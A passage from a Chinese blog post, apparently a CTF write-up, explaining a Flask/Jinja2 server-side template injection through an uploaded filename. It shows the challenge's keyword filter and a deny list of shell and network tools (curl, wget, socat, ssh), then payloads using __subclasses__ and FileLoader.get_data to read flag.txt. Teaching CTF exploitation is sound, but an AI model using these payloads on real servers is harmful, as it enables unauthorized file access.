[<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;[2]&#x27;</span>, <span class="string">&#x27;flask&#x27;</span>, <span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>] </span><br><span class="line"></span><br><span class="line">        l2 = [<span class="string">&#x27;aa-exec&#x27;</span>, <span class="string">&#x27;agetty&#x27;</span>, <span class="string">&#x27;alpine&#x27;</span>, <span class="string">&#x27;ansible-playbook&#x27;</span>, <span class="string">&#x27;ansible-test&#x27;</span>, <span class="string">&#x27;aoss&#x27;</span>, <span class="string">&#x27;apt&#x27;</span>, <span class="string">&#x27;apt-get&#x27;</span>, <span class="string">&#x27;aria2c&#x27;</span>, <span class="string">&#x27;arj&#x27;</span>, <span class="string">&#x27;arp&#x27;</span>, <span class="string">&#x27;ascii-xfr&#x27;</span>, <span class="string">&#x27;ascii85&#x27;</span>, <span class="string">&#x27;ash&#x27;</span>, <span class="string">&#x27;aspell&#x27;</span>, <span class="string">&#x27;atobm&#x27;</span>, <span class="string">&#x27;awk&#x27;</span>, <span class="string">&#x27;aws&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;base32&#x27;</span>, <span class="string">&#x27;base58&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;basenc&#x27;</span>, <span class="string">&#x27;basez&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;batcat&#x27;</span>, <span class="string">&#x27;bconsole&#x27;</span>, <span class="string">&#x27;bpftrace&#x27;</span>, <span class="string">&#x27;bridge&#x27;</span>, <span class="string">&#x27;bundle&#x27;</span>, <span class="string">&#x27;bundler&#x27;</span>, <span class="string">&#x27;busctl&#x27;</span>, <span class="string">&#x27;busybox&#x27;</span>, <span class="string">&#x27;byebug&#x27;</span>, <span class="string">&#x27;bzip2&#x27;</span>, <span class="string">&#x27;c89&#x27;</span>, <span class="string">&#x27;c99&#x27;</span>, <span class="string">&#x27;cabal&#x27;</span>, <span class="string">&#x27;cancel&#x27;</span>, <span class="string">&#x27;capsh&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;cdist&#x27;</span>, <span class="string">&#x27;certbot&#x27;</span>, <span class="string">&#x27;check_by_ssh&#x27;</span>, <span class="string">&#x27;check_cups&#x27;</span>, <span class="string">&#x27;check_log&#x27;</span>, <span class="string">&#x27;check_memory&#x27;</span>, <span class="string">&#x27;check_raid&#x27;</span>, <span class="string">&#x27;check_ssl_cert&#x27;</span>, <span class="string">&#x27;check_statusfile&#x27;</span>, <span class="string">&#x27;chmod&#x27;</span>, <span class="string">&#x27;choom&#x27;</span>, <span class="string">&#x27;chown&#x27;</span>, <span class="string">&#x27;chroot&#x27;</span>, <span class="string">&#x27;cmp&#x27;</span>, <span class="string">&#x27;cobc&#x27;</span>, <span class="string">&#x27;column&#x27;</span>, <span class="string">&#x27;comm&#x27;</span>, <span class="string">&#x27;comm &#x27;</span>, <span class="string">&#x27;composer&#x27;</span>, <span class="string">&#x27;cowsay&#x27;</span>, <span class="string">&#x27;cowthink&#x27;</span>, <span class="string">&#x27;cpan&#x27;</span>, <span class="string">&#x27;cpio&#x27;</span>, <span class="string">&#x27;cpulimit&#x27;</span>, <span class="string">&#x27;crash&#x27;</span>, <span class="string">&#x27;crontab&#x27;</span>, <span class="string">&#x27;csh&#x27;</span>, <span class="string">&#x27;csplit&#x27;</span>, <span class="string">&#x27;csvtool&#x27;</span>, <span class="string">&#x27;cupsfilter&#x27;</span>, <span class="string">&#x27;curl&#x27;</span>, <span class="string">&#x27;cut&#x27;</span>, <span class="string">&#x27;dash&#x27;</span>, <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;debugfs&#x27;</span>, <span class="string">&#x27;dialog&#x27;</span>, <span class="string">&#x27;diff&#x27;</span>, <span class="string">&#x27;dig&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;distcc&#x27;</span>, <span class="string">&#x27;dmesg&#x27;</span>, <span class="string">&#x27;dmidecode&#x27;</span>, <span class="string">&#x27;dmsetup&#x27;</span>, <span class="string">&#x27;dnf&#x27;</span>, <span class="string">&#x27;docker&#x27;</span>, <span class="string">&#x27;dos2unix&#x27;</span>, <span class="string">&#x27;dosbox&#x27;</span>, <span class="string">&#x27;dotnet&#x27;</span>, <span class="string">&#x27;dpkg&#x27;</span>, <span class="string">&#x27;dstat&#x27;</span>, <span class="string">&#x27;dvips&#x27;</span>, <span class="string">&#x27;easy_install&#x27;</span>, <span class="string">&#x27;echo&#x27;</span>, <span class="string">&#x27;efax&#x27;</span>, <span class="string">&#x27;elvish&#x27;</span>, <span class="string">&#x27;emacs&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;eqn&#x27;</span>, <span class="string">&#x27;espeak&#x27;</span>, <span class="string">&#x27;exiftool&#x27;</span>, <span class="string">&#x27;expand&#x27;</span>, <span class="string">&#x27;expect&#x27;</span>, <span class="string">&#x27;facter&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;find&#x27;</span>, <span class="string">&#x27;finger&#x27;</span>, <span class="string">&#x27;fish&#x27;</span>, <span class="string">&#x27;flock&#x27;</span>, <span class="string">&#x27;fmt&#x27;</span>, <span class="string">&#x27;fold&#x27;</span>, <span class="string">&#x27;fping&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;gawk&#x27;</span>, <span class="string">&#x27;gcc&#x27;</span>, <span class="string">&#x27;gcloud&#x27;</span>, <span class="string">&#x27;gcore&#x27;</span>, <span class="string">&#x27;gdb&#x27;</span>, <span class="string">&#x27;gem&#x27;</span>, <span class="string">&#x27;genie&#x27;</span>, <span class="string">&#x27;genisoimage&#x27;</span>, <span class="string">&#x27;ghc&#x27;</span>, <span class="string">&#x27;ghci&#x27;</span>, <span class="string">&#x27;gimp&#x27;</span>, <span class="string">&#x27;ginsh&#x27;</span>, <span class="string">&#x27;git&#x27;</span>, <span class="string">&#x27;grc&#x27;</span>, <span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;gtester&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;head&#x27;</span>, <span class="string">&#x27;hexdump&#x27;</span>, <span class="string">&#x27;highlight&#x27;</span>, <span class="string">&#x27;hping3&#x27;</span>, <span class="string">&#x27;iconv&#x27;</span>, <span class="string">&#x27;ifconfig&#x27;</span>, <span class="string">&#x27;iftop&#x27;</span>, <span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;ionice&#x27;</span>, <span class="string">&#x27;irb&#x27;</span>, <span class="string">&#x27;ispell&#x27;</span>, <span class="string">&#x27;jjs&#x27;</span>, <span class="string">&#x27;joe&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;journalctl&#x27;</span>, <span class="string">&#x27;jrunscript&#x27;</span>, <span class="string">&#x27;jtag&#x27;</span>, <span class="string">&#x27;julia&#x27;</span>, <span class="string">&#x27;knife&#x27;</span>, <span class="string">&#x27;ksh&#x27;</span>, <span class="string">&#x27;ksshell&#x27;</span>, <span class="string">&#x27;ksu&#x27;</span>, <span class="string">&#x27;kubectl&#x27;</span>, <span class="string">&#x27;latex&#x27;</span>, <span class="string">&#x27;latexmk&#x27;</span>, <span class="string">&#x27;ld.so&#x27;</span>, <span class="string">&#x27;ldconfig&#x27;</span>, <span class="string">&#x27;less&#x27;</span>, <span class="string">&#x27;less &#x27;</span>, <span class="string">&#x27;lftp&#x27;</span>, <span class="string">&#x27;loginctl&#x27;</span>, <span class="string">&#x27;logsave&#x27;</span>, <span class="string">&#x27;look&#x27;</span>, <span class="string">&#x27;ltrace&#x27;</span>, <span class="string">&#x27;lua&#x27;</span>, <span class="string">&#x27;lualatex&#x27;</span>, <span class="string">&#x27;luatex&#x27;</span>, <span class="string">&#x27;lwp-download&#x27;</span>, <span class="string">&#x27;lwp-request&#x27;</span>, <span class="string">&#x27;mail&#x27;</span>, <span class="string">&#x27;make&#x27;</span>, <span class="string">&#x27;man&#x27;</span>, <span class="string">&#x27;mawk&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;mosquitto&#x27;</span>, <span class="string">&#x27;mount&#x27;</span>, <span class="string">&#x27;msfconsole&#x27;</span>, <span class="string">&#x27;msgattrib&#x27;</span>, <span class="string">&#x27;msgcat&#x27;</span>, <span class="string">&#x27;msgconv&#x27;</span>, <span class="string">&#x27;msgfilter&#x27;</span>, <span class="string">&#x27;msgmerge&#x27;</span>, <span class="string">&#x27;msguniq&#x27;</span>, <span class="string">&#x27;mtr&#x27;</span>, <span class="string">&#x27;multitime&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;nano&#x27;</span>, <span class="string">&#x27;nasm&#x27;</span>, <span class="string">&#x27;nawk&#x27;</span>, <span class="string">&#x27;ncftp&#x27;</span>, <span class="string">&#x27;neofetch&#x27;</span>, <span class="string">&#x27;netstat&#x27;</span>, <span class="string">&#x27;nft&#x27;</span>, <span class="string">&#x27;nice&#x27;</span>, <span class="string">&#x27;nmap&#x27;</span>, <span class="string">&#x27;node&#x27;</span>, <span class="string">&#x27;nohup&#x27;</span>, <span class="string">&#x27;npm&#x27;</span>, <span class="string">&#x27;nroff&#x27;</span>, <span class="string">&#x27;nsenter&#x27;</span>, <span class="string">&#x27;nslookup&#x27;</span>, <span class="string">&#x27;octave&#x27;</span>, <span class="string">&#x27;openssl&#x27;</span>, <span class="string">&#x27;openvpn&#x27;</span>, <span class="string">&#x27;openvt&#x27;</span>, <span class="string">&#x27;opkg&#x27;</span>, <span class="string">&#x27;pandoc&#x27;</span>, <span class="string">&#x27;paste&#x27;</span>, <span class="string">&#x27;pax&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pdflatex&#x27;</span>, <span class="string">&#x27;pdftex&#x27;</span>, <span class="string">&#x27;perf&#x27;</span>, <span class="string">&#x27;perl&#x27;</span>, <span class="string">&#x27;perlbug&#x27;</span>, <span class="string">&#x27;pexec&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;pic&#x27;</span>, <span class="string">&#x27;pico&#x27;</span>, <span class="string">&#x27;pidstat&#x27;</span>, <span class="string">&#x27;ping&#x27;</span>, <span class="string">&#x27;pip&#x27;</span>, <span class="string">&#x27;pkexec&#x27;</span>, <span class="string">&#x27;pkg&#x27;</span>, <span class="string">&#x27;posh&#x27;</span>, <span class="string">&#x27;pry&#x27;</span>, <span class="string">&#x27;psftp&#x27;</span>, <span class="string">&#x27;psql&#x27;</span>, <span class="string">&#x27;ptx&#x27;</span>, <span class="string">&#x27;puppet&#x27;</span>, <span class="string">&#x27;pwsh&#x27;</span>, <span class="string">&#x27;rake&#x27;</span>, <span class="string">&#x27;readelf&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;redcarpet&#x27;</span>, <span class="string">&#x27;redis&#x27;</span>, <span class="string">&#x27;restic&#x27;</span>, <span class="string">&#x27;rev&#x27;</span>, <span class="string">&#x27;rlogin&#x27;</span>, <span class="string">&#x27;rlwrap&#x27;</span>, <span class="string">&#x27;route&#x27;</span>, <span class="string">&#x27;rpm&#x27;</span>, <span class="string">&#x27;rpmdb&#x27;</span>, <span class="string">&#x27;rpmquery&#x27;</span>, <span class="string">&#x27;rpmverify&#x27;</span>, <span class="string">&#x27;rsync&#x27;</span>, <span class="string">&#x27;rtorrent&#x27;</span>, <span class="string">&#x27;ruby&#x27;</span>, <span class="string">&#x27;run-mailcap&#x27;</span>, <span class="string">&#x27;run-parts&#x27;</span>, <span class="string">&#x27;rview&#x27;</span>, <span class="string">&#x27;rvim&#x27;</span>, <span class="string">&#x27;sash&#x27;</span>, <span class="string">&#x27;scanmem&#x27;</span>, <span class="string">&#x27;scp&#x27;</span>, <span class="string">&#x27;screen&#x27;</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;scrot&#x27;</span>, <span class="string">&#x27;sed&#x27;</span>, <span class="string">&#x27;service&#x27;</span>, <span class="string">&#x27;setarch&#x27;</span>, <span class="string">&#x27;setfacl&#x27;</span>, <span class="string">&#x27;setlock&#x27;</span>, <span class="string">&#x27;sftp&#x27;</span>, <span class="string">&#x27;shuf&#x27;</span>, <span class="string">&#x27;slsh&#x27;</span>, <span class="string">&#x27;smbclient&#x27;</span>, <span class="string">&#x27;snap&#x27;</span>, <span class="string">&#x27;socat&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;soelim&#x27;</span>, <span class="string">&#x27;softlimit&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sqlmap&#x27;</span>, <span class="string">&#x27;ssh&#x27;</span>, <span class="string">&#x27;ssh-agent&#x27;</span>, <span class="string">&#x27;ssh-keygen&#x27;</span>, <span class="string">&#x27;ssh-keyscan&#x27;</span>, <span class="string">&#x27;sshpass&#x27;</span>, <span class="string">&#x27;start-stop-daemon&#x27;</span>, <span class="string">&#x27;stdbuf&#x27;</span>, <span class="string">&#x27;strace&#x27;</span>, <span class="string">&#x27;strings&#x27;</span>, <span class="string">&#x27;sysctl&#x27;</span>, <span class="string">&#x27;systemctl&#x27;</span>, <span class="string">&#x27;systemd-resolve&#x27;</span>, <span class="string">&#x27;tac&#x27;</span>, <span class="string">&#x27;tail&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;task&#x27;</span>, <span class="string">&#x27;taskset&#x27;</span>, <span class="string">&#x27;tasksh&#x27;</span>, <span class="string">&#x27;tbl&#x27;</span>, <span class="string">&#x27;tclsh&#x27;</span>, <span class="string">&#x27;tcpdump&#x27;</span>, <span class="string">&#x27;tdbtool&#x27;</span>, <span class="string">&#x27;tee&#x27;</span>, <span class="string">&#x27;telnet&#x27;</span>, <span class="string">&#x27;tex&#x27;</span>, <span class="string">&#x27;tftp&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;timedatectl&#x27;</span>, <span class="string">&#x27;timeout&#x27;</span>, <span class="string">&#x27;tmate&#x27;</span>, <span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;top&#x27;</span>, <span class="string">&#x27;torify&#x27;</span>, <span class="string">&#x27;torsocks&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;traceroute&#x27;</span>, <span class="string">&#x27;troff&#x27;</span>, <span class="string">&#x27;truncate&#x27;</span>, <span class="string">&#x27;tshark&#x27;</span>, <span class="string">&#x27;unexpand&#x27;</span>, <span class="string">&#x27;uniq&#x27;</span>, <span class="string">&#x27;unshare&#x27;</span>, <span class="string">&#x27;unzip&#x27;</span>, <span class="string">&#x27;update-alternatives&#x27;</span>, <span class="string">&#x27;uudecode&#x27;</span>, <span class="string">&#x27;uuencode&#x27;</span>, <span class="string">&#x27;vagrant&#x27;</span>, <span class="string">&#x27;valgrind&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;vigr&#x27;</span>, <span class="string">&#x27;vim&#x27;</span>, <span class="string">&#x27;vimdiff&#x27;</span>, <span class="string">&#x27;vipw&#x27;</span>, <span class="string">&#x27;virsh&#x27;</span>, <span class="string">&#x27;volatility&#x27;</span>, <span class="string">&#x27;w3m&#x27;</span>, <span class="string">&#x27;wall&#x27;</span>, <span class="string">&#x27;watch&#x27;</span>, <span class="string">&#x27;wget&#x27;</span>, <span class="string">&#x27;whiptail&#x27;</span>, <span class="string">&#x27;whois&#x27;</span>, <span class="string">&#x27;wireshark&#x27;</span>, <span class="string">&#x27;wish&#x27;</span>, <span class="string">&#x27;xargs&#x27;</span>, <span class="string">&#x27;xdotool&#x27;</span>, <span class="string">&#x27;xelatex&#x27;</span>, <span class="string">&#x27;xetex&#x27;</span>, <span class="string">&#x27;xmodmap&#x27;</span>, <span class="string">&#x27;xmore&#x27;</span>, <span class="string">&#x27;xpad&#x27;</span>, <span class="string">&#x27;xxd&#x27;</span>, <span class="string">&#x27;yarn&#x27;</span>, <span class="string">&#x27;yash&#x27;</span>, <span class="string">&#x27;yelp&#x27;</span>, <span class="string">&#x27;yum&#x27;</span>, <span class="string">&#x27;zathura&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;zsoelim&#x27;</span>, <span class="string">&#x27;zypper&#x27;</span>]</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> l1:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> template.lower():</span><br><span class="line">                <span class="built_in">print</span>(template, i, file=sys.stderr)</span><br><span class="line">                template = <span class="string">&quot;nice try&quot;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        matches = re.findall(<span class="string">r&quot;[&#x27;\&quot;](.*?)[&#x27;\&quot;]&quot;</span>, template)</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">            <span class="built_in">print</span>(<span class="keyword">match</span>, file=sys.stderr)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z0-9 \/\.\-]+$&#x27;</span>, <span class="keyword">match</span>):</span><br><span class="line">                template = <span class="string">&quot;nice try&quot;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l2:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> <span class="keyword">match</span>.lower():</span><br><span class="line">                    <span class="built_in">print</span>(i, file=sys.stderr)</span><br><span class="line">                    template = <span class="string">&quot;nice try&quot;</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure>
+
+<p>代码最后这句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return render_template_string(template)</span><br></pre></td></tr></table></figure>
+
+<p>这是 Flask 的模板渲染函数之一，它接受一个<strong>字符串形式</strong>的模板，并执行其中的 Jinja2 模板表达式。</p>
+<p>这就比普通的 <code>render_template(&#39;index.html&#39;)</code> 要危险很多，因为它不是在渲染一个静态 HTML 文件而是动态生成的字符串，里面的内容会被解释执行！</p>
+<p><strong>这个字符串是怎么来的？</strong></p>
+<p>来看这几句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">template = f&quot;&quot;&quot;</span><br><span class="line">    &#123;file.filename&#125; is not valid because it is too big or has the wrong extension</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>→ 也就是说：<strong>用户上传的文件名（</strong><code>**file.filename**</code><strong>）直接被拼进了模板字符串中</strong>，然后被 <code>render_template_string()</code> 渲染了。</p>
+<p>这意味着，如果你上传一个文件，<strong>文件名中只要包含合法的 Jinja2 模板语法（如 <strong><code>**&#123;&#123;7*7&#125;&#125;**</code></strong>），它就会被解释执行！</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l1 = [&#x27;+&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;&#125;&#125;&#x27;, &#x27;[2]&#x27;, &#x27;flask&#x27;, &#x27;os&#x27;,&#x27;config&#x27;, &#x27;subprocess&#x27;, &#x27;debug&#x27;, &#x27;read&#x27;, &#x27;write&#x27;, &#x27;exec&#x27;, &#x27;popen&#x27;, &#x27;import&#x27;, &#x27;request&#x27;, &#x27;|&#x27;, &#x27;join&#x27;, &#x27;attr&#x27;, &#x27;globals&#x27;, &#x27;\\&#x27;] </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">针对过滤的字符，我们可以用：**&#123;% print(...) %&#125; **</span><br><span class="line"></span><br><span class="line">**&#123;% print(...) %&#125; 是什么意思？**</span><br><span class="line"></span><br><span class="line">这是 **Jinja2 模板语法中的一种语句块写法**，叫做「控制语句」，表示我们要在模板中执行一个 Python 表达式或语句。</span><br></pre></td></tr></table></figure>
+
+<p>Jinja2 模板语法分两种括号：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>写法</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输出表达式</td>
+<td><code>&#123;&#123; ... &#125;&#125;</code></td>
+<td>把结果“显示”在网页上</td>
+</tr>
+<tr>
+<td>执行语句</td>
+<td><code>&#123;% ... %&#125;</code></td>
+<td>执行某段代码，不自动输出</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们把文件命名为`&#123;% print([].__class__.__base__.__subclasses__()%&#125;`</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1753085456873-c54e9251-b66c-411b-a36e-0f448d781de8.png"></p>
+<p>然后在 99 找到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(object.__subclasses__()[99]) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1753085699337-48370e2d-230f-4f7c-9c31-0298626cb604.png"></p>
+<h2 id="FileLoader-是干嘛的？"><a href="#FileLoader-是干嘛的？" class="headerlink" title="FileLoader 是干嘛的？"></a><code>FileLoader</code> 是干嘛的？</h2><p>它是 Python 内置模块中的一个类，用来 <strong>加载 Python 文件</strong>。</p>
+<p>它的结构大概如下（简化）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">class FileLoader:</span><br><span class="line">    def __init__(self, name, path):</span><br><span class="line">        ...</span><br><span class="line">    def get_data(self, path):</span><br><span class="line">        with open(path, &#x27;rb&#x27;) as f:</span><br><span class="line">            return f.read()</span><br></pre></td></tr></table></figure>
+
+<p>你可以看到它的 <code>get_data(path)</code> 方法就是读取文件内容！</p>
+<h2 id="参数为什么是-0-flag-txt-？"><a href="#参数为什么是-0-flag-txt-？" class="headerlink" title="参数为什么是 (0, &#39;flag.txt&#39;)？"></a>参数为什么是 <code>(0, &#39;flag.txt&#39;)</code>？</h2><p>你传的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.get_data(0, &#x27;flag.txt&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>实际上真正的定义是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_data(path: str)</span><br></pre></td></tr></table></figure>
+
+<p>所以：</p>
+<ul>
+<li>你只需要传一个参数：路径；</li>
+<li>但这个类可能做了一些包装，<code>self.get_data(loader_context, path)</code> 也是可能的；</li>
+<li>所以传一个不影响读取的参数（<code>None</code>、<code>0</code>）也行。</li>
+</ul>
+<p>你只要试出来 **哪一类能用 **<code>**.get_data()**</code>，就可以传参数试着读文件。</p>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>Author：<a href="http://example.com">温柔刀</a>
+            <p>Link：<a href="http://example.com/2025/07/21/SSTI/">http://example.com/2025/07/21/SSTI/</a>
+            <p>Publish date：<a href="http://example.com/2025/07/21/SSTI/">July 21st 2025, 5:26:09 pm</a>
+            <p>Update date：<a href="http://example.com/2025/07/21/SSTI/">July 22nd 2025, 11:27:53 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/07/18/L3NCTF-Web%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="L3NCTF-Web题目部分复现">
+                    <div class="prevTitle">L3NCTF-Web题目部分复现</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+        <script>
+            (function () {
+                const time = document.getElementsByClassName('post-intro-time')[0]
+                const post = document.getElementsByTagName("article")[0]
+                if (time === undefined || post === undefined) {
+                    return
+                }
+
+                const pubTime = new Date(time.innerText)
+                const now = Date.now()
+                const interval = parseInt(now - pubTime)
+                const days = parseInt(interval / 86400000)
+                const outdated_threshold = parseInt(180)
+                if (interval > outdated_threshold * 24 * 3600 * 1000) {
+                    post.innerHTML = '<div class="note note-warning">' +
+                    `<div class="title">文章时效性提示</div><p>这是一篇发布于 ${days} 天前的文章，部分信息可能已发生改变，请注意甄别。` +
+                    '</p></div>' + post.innerHTML;
+                }
+            })();
+        </script>
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:12345@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title="github"></a>
+                <span class="iconfont-archer wechat" title="wechat">
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%90%86%E8%AE%BA"><span class="toc-number">1.</span> <span class="toc-text">理论</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-SSTI%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E5%AE%83%E6%98%AF%E4%B8%80%E4%B8%AA%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 SSTI？为什么它是一个漏洞？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%EF%BC%9F"><span class="toc-number">1.1.1.</span> <span class="toc-text">什么是模板引擎？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.2.</span> <span class="toc-text">SSTI 是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-SSTI-%E5%BE%88%E5%8D%B1%E9%99%A9%EF%BC%9F"><span class="toc-number">1.1.3.</span> <span class="toc-text">为什么 SSTI 很危险？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.4.</span> <span class="toc-text">简单总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 